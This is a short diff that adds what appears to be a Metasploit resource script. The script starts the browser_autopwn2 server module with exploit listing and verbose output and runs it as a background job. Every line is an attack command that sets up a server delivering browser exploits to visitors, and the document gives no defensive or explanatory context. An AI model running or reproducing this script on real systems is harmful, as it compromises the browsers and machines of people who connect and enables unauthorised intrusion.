@@ -1,0 +1,4 @@
+use auxiliary/server/browser_autopwn2
+set ShowExploitList true
+set VERBOSE true
+run -j
